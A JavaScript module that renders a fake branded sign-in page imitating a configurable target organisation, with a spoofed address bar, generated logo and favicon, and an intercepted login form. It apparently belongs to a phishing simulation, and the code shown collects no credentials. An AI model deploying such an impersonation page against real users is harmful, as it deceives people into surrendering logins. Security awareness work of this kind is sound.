/* ============================================================
   decoy.js — Renders the fake page that mimics the target site
   ============================================================ */

const Decoy = (() => {

  /** Apply target-site branding to the decoy layer */
  function render(cfg) {
    // Page title
    document.title = `Sign in – ${cfg.orgName}`;

    // Fake address bar
    document.getElementById('fakeUrl').textContent = `https://${cfg.domain}${cfg.path}`;

    // Logo — generate an SVG letter-icon with the brand colour
    const logo = document.getElementById('decoyLogo');
    const svg  = generateLogoSvg(cfg.logoLetter, cfg.brandColor);
    logo.src   = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);

    // Title / subtitle
    document.getElementById('decoyTitle').textContent    = `Sign in to ${cfg.orgName}`;
    document.getElementById('decoySubtitle').textContent = `Use your ${cfg.orgName} account`;
    document.getElementById('decoyEmail').placeholder    = `user@${cfg.domain}`;

    // Footer
    document.getElementById('decoyFooter').innerHTML =
      `&copy; ${new Date().getFullYear()} ${cfg.orgName}. All rights reserved.`;

    // Accent colour on button
    const btn = document.getElementById('decoySubmit');
    btn.style.background = cfg.brandColor;

    // Favicon
    const fav = document.getElementById('favicon');
    fav.href = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);

    // Apply brand colour to fake address bar lock icon
    document.querySelector('.lock-icon').style.color = cfg.brandColor;
  }

  /** Tiny SVG logo generator */
  function generateLogoSvg(letter, color) {
    return `<svg xmlns="http://www.w3.org/2000/svg" width="56" height="56" viewBox="0 0 56 56">
      <rect width="56" height="56" rx="12" fill="${color}"/>
      <text x="28" y="38" text-anchor="middle" font-size="30" font-weight="700"
            fill="#fff" font-family="sans-serif">${letter}</text>
    </svg>`;
  }

  /** Show a brief spinner, then fire callback */
  function showSpinner(duration, cb) {
    const overlay = document.createElement('div');
    overlay.className = 'spinner-overlay';
    overlay.innerHTML = '<div class="spinner"></div>';
    document.body.appendChild(overlay);
    setTimeout(() => {
      overlay.remove();
      cb();
    }, duration);
  }

  /** Wire up the fake form */
  function bindForm(onSubmit) {
    document.getElementById('decoyForm').addEventListener('submit', e => {
      e.preventDefault();
      onSubmit();
    });
  }

  /** Hide the decoy layer */
  function hide() {
    document.getElementById('decoy').style.display = 'none';
  }

  return { render, bindForm, showSpinner, hide };
})();
